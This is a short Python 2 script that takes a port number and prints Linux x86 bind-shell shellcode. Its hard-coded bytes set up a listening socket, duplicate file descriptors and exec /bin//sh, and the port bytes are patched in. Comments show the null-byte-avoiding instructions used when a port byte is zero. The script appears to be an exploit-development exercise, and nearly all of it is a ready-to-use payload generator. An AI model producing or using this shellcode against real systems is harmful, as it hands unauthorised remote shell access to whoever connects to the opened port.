#!/usr/bin/python


shellcode1 = "\\x31\\xdb\\xf7\\xe3\\x50\\x04\\x66\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x97\\x43\\x56"
#\\x66\\x68\\x11\\x5c
shellcode2 = "\\x66\\x53\\x89\\xe1\\x04\\x66\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x04\\x66\\x53\\xd0\\xe3\\x57\\x89\\xe1\\xcd\\x80\\x04\\x66\\xfe\\xc3\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x93\\x31\\xc9\\x80\\xc1\\x02\\x31\\xc0\\x04\\x3f\\xcd\\x80\\x49\\x79\\xf7\\x50\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"

str = input("Enter port number: ")

portnum = int(str)
if portnum < 1 or portnum > 65535:
	print "Invalid range"
else:
	upper = portnum / 256
	lower = portnum % 256

	upperHex = "\\" + hex(upper)[1:]
	lowerHex = "\\" + hex(lower)[1:]

	shellcodeLen = 95
	variablePart = ""

	if upper == 0:
		# 31 c9                	xor    ecx,ecx
		# 66 81 c1 01 50       	add    cx,0x5001 ; port = 80, 0x5000
		# fe c9                	dec    cl
		# 66 51                	push   cx

		upper += 1
		upperHex = "\\" + hex(upper)[1:]

                variablePart = "\\x31\\xc9\\x66\\x81\\xc1" + upperHex + lowerHex + "\\xfe\\xc9\\x66\\x51"
                shellcodeLen = 102
	elif lower == 0:
		# 31 c9                	xor    ecx,ecx
		# 66 81 c1 50 01       	add    cx,0x150  ; port = 20480, 0x0050
		# fe cd                	dec    ch
		# 66 51                	push   cx

		lower += 1
		lowerHex = "\\" + hex(lower)[1:]

		variablePart = "\\x31\\xc9\\x66\\x81\\xc1" + upperHex + lowerHex + "\\xfe\\xcd\\x66\\x51"
		shellcodeLen = 102
	else:
		# 66 68 11 5c          	pushw  0x5c11    ; port = 4444, 0x115c
		variablePart = "\\x66\\x68" + upperHex + lowerHex
		shellcodeLen = 95

	print ""
	print "Length of shellcode: %d bytes" % (shellcodeLen)
	print ""
	print "Shellcode: \"" + shellcode1 + variablePart + shellcode2 + "\""
	print ""
